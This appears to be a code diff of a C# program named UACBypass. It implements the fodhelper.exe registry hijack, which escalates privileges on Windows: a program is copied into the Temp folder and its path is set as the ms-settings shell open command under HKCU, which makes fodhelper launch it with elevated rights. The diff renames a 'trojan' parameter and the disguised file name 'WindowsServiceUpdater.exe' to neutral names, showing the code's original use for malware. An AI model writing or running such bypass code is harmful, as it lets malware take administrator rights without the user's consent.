@@ -10,11 +10,11 @@ namespace UACBypass
             ByPass(@"C:\Windows\System32\cmd.exe");
         }
 
-        public static void ByPass(string trojanPath)
+        public static void ByPass(string programPath)
         {
-            // Step 1: copy trojan to temp as WindowsServiceUpdater.exe
-            string destinationFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "WindowsServiceUpdater.exe");
-            File.Copy(trojanPath, destinationFilePath, true);
+            // Step 1: copy program to temp as abc.exe
+            string destinationFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "abc.exe");
+            File.Copy(programPath, destinationFilePath, true);
 
             // Step 2: create registry key
             RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command");
@@ -22,7 +22,7 @@ namespace UACBypass
             // Step 3: set DelegateExecute value
             key.SetValue("DelegateExecute", "");
 
-            // Step 4: set default value to the path of WindowsServiceUpdater.exe
+            // Step 4: set default value to the path of abc.exe
             key.SetValue(null, destinationFilePath);
 
             // Step 5: start fodhelper.exe
